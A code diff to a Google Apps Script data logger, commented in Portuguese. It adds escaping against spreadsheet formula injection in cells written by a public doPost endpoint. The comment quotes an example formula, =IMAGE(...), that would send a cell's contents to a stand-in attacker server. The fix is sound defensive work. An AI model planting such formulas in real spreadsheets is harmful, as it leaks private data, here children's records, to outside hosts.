@@ -57,11 +57,23 @@ var CABECALHO = [
   'Retomada', 'Posição na sessão', 'Modo foco', 'Dispositivo'
 ];
 
+/**
+ * O Sheets trata string começada por = + - @ como FÓRMULA, não como texto.
+ * Como o doPost é público de propósito (qualquer pessoa com a URL grava, e a
+ * URL está no HTML publicado), uma linha maliciosa poderia plantar
+ * =IMAGE("http://servidor-do-atacante/"&A2) numa célula: o Sheets buscaria a
+ * imagem e o conteúdo de A2 sairia dentro da própria URL do request. Numa
+ * planilha com nome e desempenho de crianças, isso é vazamento.
+ * Nenhum campo do esquema começa legitimamente com esses caracteres, então
+ * prefixar com apóstrofo (marcador de "isto é texto") não perde nada.
+ */
 function celula_(v) {
   if (v === null || v === undefined) return '';
   if (typeof v === 'boolean') return v ? 'sim' : 'nao';
-  if (Array.isArray(v)) return v.join(' | ');
-  return v;
+  if (Array.isArray(v)) v = v.join(' | ');
+  if (typeof v !== 'string') return v;                 // números passam direto
+  if (v.length > 300) v = v.slice(0, 300);             // nenhum campo legítimo é longo
+  return /^[=+\-@\t\r]/.test(v) ? "'" + v : v;
 }
 
 function doPost(e) {
